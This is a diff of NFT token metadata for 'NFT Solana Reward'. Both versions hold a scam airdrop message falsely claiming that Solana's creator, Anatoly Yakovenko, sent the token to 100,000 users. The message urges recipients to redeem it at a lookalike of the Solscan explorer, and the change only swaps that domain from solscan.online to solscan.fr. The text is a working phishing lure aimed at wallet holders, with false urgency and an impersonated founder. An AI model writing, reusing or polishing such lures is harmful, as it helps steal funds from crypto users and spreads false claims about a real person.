@@ -1,7 +1,7 @@
 {
     "name": "NFT Solana Reward",
     "symbol": "SOLNFT",
-    "description": "Congratulations! You are one of the 100,000 Solana users who recently received this NFT token from the creator of Solana, Anatoly Yakovenko. You need to exchange this token for NFT at https://solscan.online ! Only 1000 NFTs are available!",
-    "external_url": "https://solscan.online",
+    "description": "Congratulations! You are one of the 100,000 Solana users who recently received this NFT token from the creator of Solana, Anatoly Yakovenko. You need to exchange this token for NFT at https://solscan.fr ! Only 1000 NFTs are available!",
+    "external_url": "https://solscan.fr",
     "image": "https://raw.githubusercontent.com/SolscanNFT/solscan.nft/main/Gold%20pass.png"
 }
